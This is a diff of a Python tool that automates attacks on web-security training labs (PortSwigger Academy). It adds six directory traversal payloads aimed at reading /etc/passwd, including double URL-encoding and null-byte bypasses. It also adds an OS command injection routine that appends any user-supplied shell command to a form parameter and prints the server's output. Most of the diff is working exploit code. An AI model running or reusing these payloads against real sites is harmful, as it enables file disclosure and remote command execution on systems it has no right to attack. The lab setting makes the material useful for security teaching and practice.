@@ -41,26 +41,33 @@ def loadingEffect(effectText, effectTime):
     with console.status(f"[bold green]{effectText}"):
         time.sleep(effectTime)
 
-
-def ex():
-    print("\nGoodbye! :D")
-    sys.exit()
+def encode_all(inputToEncode):
+    return "".join("%{0:0>2x}".format(ord(char)) for char in inputToEncode)
 
 
 def pressAnyKey():
     loadingEffect("...", 1)
-    input("\npress any key to continue...")
+    checkCommand(input("\npress any key to continue..."))
     paas()
 
 
 def checkUrl(url):
-    if url.endswith('/'):
-        url = url[:-1]
+    if url.count("/") >= 3:
+        url = "/".join(url.split("/")[:3])
+
     return url
 
 
+def checkCommand(cmd):
+    if cmd == "exit":
+        print("\nGoodbye :D")
+        sys.exit(-1)
+
+    return cmd
+
+
 def createUserList(labName):
-    input("\npress any key to see user list...")
+    checkCommand(input("\npress any key to see user list..."))
 
     loadingEffect("creating user list...", 2)
 
@@ -76,12 +83,12 @@ def createUserList(labName):
                 print("wiener")
     print("==== THE END OF THE USER LIST ====")
 
-    input("\npress any key to continue")
+    checkCommand(input("\npress any key to continue"))
     paas()
 
 
 def createPasswordList(labName):
-    input("\npress any key to see password list...")
+    checkCommand(input("\npress any key to see password list..."))
 
     loadingEffect("creating password list...", 2)
 
@@ -104,14 +111,14 @@ def createPasswordList(labName):
             i = i +1
     print("==== THE END OF THE PASSWORD LIST ====")
 
-    input("\npress any key to continue")
+    checkCommand(input("\npress any key to continue"))
     paas()
 
 
 def invalidCharacterNumber():
     print("Enter a valid category number!")
     print("It is not a valid category number.")
-    loadingEffect("tool is closing...", 1.5)
+    loadingEffect("tool is closing...", 3)
     sys.exit(-1)
 
 
@@ -127,11 +134,9 @@ def authentication():
     for key, value in menu_options.items():
         print(f"[{key}] {value}")
 
-    inpt = input("\nSelect Lab: ")
+    inpt = checkCommand(input("\nSelect Lab: "))
 
-    if inpt == "exit":
-        ex()
-    elif int(inpt) == 1:
+    if int(inpt) == 1:
         auth_lab1()
     elif int(inpt) == 2:
         auth_lab2()
@@ -149,7 +154,7 @@ def auth_lab1():
     print("== Authentication/2FA Simple Bypass ==")
     print("example: https://lab-id.web-security-academy.net/")
 
-    url = checkUrl(input("url: "))
+    url = checkCommand(checkUrl(input("url: ")))
 
     # Log into Carlos's account
     paas()
@@ -175,7 +180,7 @@ def auth_lab2():
     print("== Authentication/Password reset broken logic ==\n")
     print("example: https://lab-id.web-security-academy.net/")
 
-    url = checkUrl(input("url: "))
+    url = checkCommand(checkUrl(input("url: ")))
 
     # Reset Carlos's password
     pass_reset_url = url + "/forgot-password?temp-forgot-password-token=ilovekokorec"
@@ -244,7 +249,7 @@ def auth_lab4():
     print("== Authentication/Brute-forcing a stay-logged-in cookie ==\n")
     print("example: https://lab-id.web-security-academy.net/")
 
-    url = checkUrl(input("url: "))
+    url = checkCommand(checkUrl(input("url: ")))
 
     print("\nGenerating cookies and running attack...")
 
@@ -269,38 +274,52 @@ def directoryTraversal():
     menu_options = {
         1: "Lab: File path traversal, simple case",
         2: "Lab: Traversal sequences blocked with absolute path bypass",
-        3: "Lab: Traversal sequences stripped non-recursively"
+        3: "Lab: Traversal sequences stripped non-recursively",
+        4: "Lab: Traversal sequences stripped with superfluous URL-decode",
+        5: "Lab: Validation of start of path",
+        6: "Lab: Validation of file extension with null byte bypass"
     }
     for key, value in menu_options.items():
         print(f"[{key}] {value}")
 
-    inpt = input("\nSelect Lab: ")
+    inpt = checkCommand(input("\nSelect Lab: "))
 
-    if inpt == "exit":
-        ex()
-    elif int(inpt) == 1:
-        dir_traversal_lab123(1)
+    if int(inpt) == 1:
+        dir_traversal_labs(1)
     elif int(inpt) == 2:
-        dir_traversal_lab123(2)
+        dir_traversal_labs(2)
     elif int(inpt) == 3:
-        dir_traversal_lab123(3)
+        dir_traversal_labs(3)
     elif int(inpt) == 4:
-        auth_lab4()
-    elif int(inpt) <= 1 or int(inpt) >= 5:
+        dir_traversal_labs(4)
+    elif int(inpt) == 5:
+        dir_traversal_labs(5)
+    elif int(inpt) == 6:
+        dir_traversal_labs(6)
+    elif int(inpt) <= 1 or int(inpt) >= 7:
         invalidCharacterNumber()
 
-def dir_traversal_lab123(option):
+def dir_traversal_labs(option):
     paas()
     print("== Directory Traversal ==\n")
     print("example: https://lab-id.web-security-academy.net/")
 
-    url = checkUrl(input("url: "))
+    url = checkCommand(checkUrl(input("url: ")))
     if option == 1:
         image_url = url + "/image?filename=../../../../etc/passwd"
     elif option == 2:
         image_url = url + "/image?filename=/etc/passwd"
     elif option == 3:
         image_url = url + "/image?filename=....//....//....//etc/passwd"
+    elif option == 4:
+        img_url_need_encode = "../../../etc/passwd"
+        img_url_encoded = encode_all(img_url_need_encode)
+        img_url_double_encoded = encode_all(img_url_encoded)
+        image_url = url + "/image?filename=" + img_url_double_encoded
+    elif option == 5:
+        image_url = url + "/image?filename=/var/www/images/../../../etc/passwd"
+    elif option == 6:
+        image_url = url + "/image?filename=../../../etc/passwd%0048.jpg"
 
     s = requests.get(image_url, verify=False, proxies=proxies)
     if "root:x" in s.text:
@@ -312,6 +331,55 @@ def dir_traversal_lab123(option):
     else:
         print("\n[-] Exploit failed.")
         sys.exit(-1)
+
+def osCommandInjection():
+    paas()
+    print("== Os Command Injection Menu ==")
+    menu_options = {
+        1: "Lab: OS command injection, simple case",
+        2: "Lab: coming soon..."
+    }
+    for key, value in menu_options.items():
+        print(f"[{key}] {value}")
+
+    inpt = checkCommand(input("\nSelect Lab: "))
+
+    if int(inpt) == 1:
+        osCommandInjection1()
+    elif int(inpt) == 2:
+        print("coming soon...")
+    elif int(inpt) == 3:
+        print("coming soon...")
+    elif int(inpt) == 4:
+        print("coming soon...")
+    elif int(inpt) == 5:
+        print("coming soon...")
+    elif int(inpt) == 6:
+        print("coming soon...")
+    elif int(inpt) <= 1 or int(inpt) >= 7:
+        invalidCharacterNumber()
+
+def osCommandInjection1():
+    paas()
+    print("== OS Command Injection/simple case ==\n")
+    print("example: https://lab-id.web-security-academy.net/")
+
+    url = checkCommand(checkUrl(input("url: ")))
+    command = checkCommand(input("command: "))
+
+    loadingEffect("attacking...", 2)
+
+    stock_check_url = url + "/product/stock"
+    injection_code = "1 & " + command
+    parameters = {"productId": "1", "storeId": injection_code}
+    r = requests.post(stock_check_url, data=parameters, verify=False, proxies=proxies)
+
+    if len(r.text) > 3:
+        print("[+] Attack successfully completed! ")
+        print("\n[+] Return from the target: " + r.text)
+    else:
+        print("[-] Attack failed!")
+
 
 def main():
 
@@ -330,23 +398,19 @@ def main():
     menu_options = {
         1: "Authentication Labs",
         2: "Directory Traversal Labs",
-        3: "SQLi Labs",
-        4: "XSS Labs"
+        3: "OS Command Injection Labs",
     }
     for key, value in menu_options.items():
         print(f"[{key}] {value}")
 
     try:
-        inpt = input("\nSelect Vulnerability: ")
-        if inpt == "exit":
-            ex()
-        elif int(inpt) == 1:
+        inpt = checkCommand(input("\nSelect Vulnerability: "))
+        if int(inpt) == 1:
             authentication()
         elif int(inpt) == 2:
             directoryTraversal()
         elif int(inpt) == 3:
-            print("coming soon...")
-            sys.exit(-1)
+            osCommandInjection()
         elif int(inpt) <= 0 or int(inpt) >= 4:
             print("Enter a valid category number!")
             print(inpt + " is not a valid category number.")
@@ -357,9 +421,12 @@ def main():
             main()
     except Exception as e:
         paas()
+
+        # print error for development
         print(e)
+
         print("Invalid Input!")
-        loadingEffect("tool is closing...", 2)
+        loadingEffect("tool is closing...", 3)
         sys.exit(-1)
 
 
